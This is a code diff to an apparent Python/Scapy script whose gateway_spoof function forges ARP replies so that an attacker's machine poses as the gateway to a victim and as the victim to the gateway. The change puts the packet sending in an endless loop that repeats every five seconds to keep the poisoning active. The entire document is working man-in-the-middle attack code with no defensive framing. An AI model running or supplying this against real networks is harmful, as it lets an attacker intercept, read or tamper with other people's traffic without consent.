@@ -3,25 +3,26 @@ import time
 
 def gateway_spoof(ipGateway, ipAttacker, ipVictim, macGateway, macAttacker, macVictim, interface):
 
+    while True:
+        #telling the victim that we are the gateway
+        arpVictim = Ether()/ARP()
+        arpVictim[Ether].src = macAttacker
+        arpVictim[ARP].hwsrc = macAttacker
+        arpVictim[ARP].psrc = ipGateway
+        arpVictim[ARP].hwdst = macVictim
+        arpVictim[ARP].pdst = ipVictim
 
-    #telling the victim that we are the gateway
-    arpVictim = Ether()/ARP()
-    arpVictim[Ether].src = macAttacker
-    arpVictim[ARP].hwsrc = macAttacker
-    arpVictim[ARP].psrc = ipGateway
-    arpVictim[ARP].hwdst = macVictim
-    arpVictim[ARP].pdst = ipVictim
+        #telling the gateway that we are the victim
+        arpGateway = Ether()/ARP()
+        arpGateway[Ether].src = macAttacker
+        arpGateway[ARP].hwsrc = macAttacker
+        arpGateway[ARP].psrc = ipVictim
+        arpGateway[ARP].hwdst = macGateway
+        arpGateway[ARP].pdst = ipGateway
 
-    #telling the gateway that we are the victim
-    arpGateway = Ether()/ARP()
-    arpGateway[Ether].src = macAttacker
-    arpGateway[ARP].hwsrc = macAttacker
-    arpGateway[ARP].psrc = ipVictim
-    arpGateway[ARP].hwdst = macGateway
-    arpGateway[ARP].pdst = ipGateway
-
-    sendp(arpVictim, iface=interface)
-    sendp(arpGateway, iface=interface)
+        sendp(arpVictim, iface=interface)
+        sendp(arpGateway, iface=interface)
+        time.sleep(5)
 
     
 
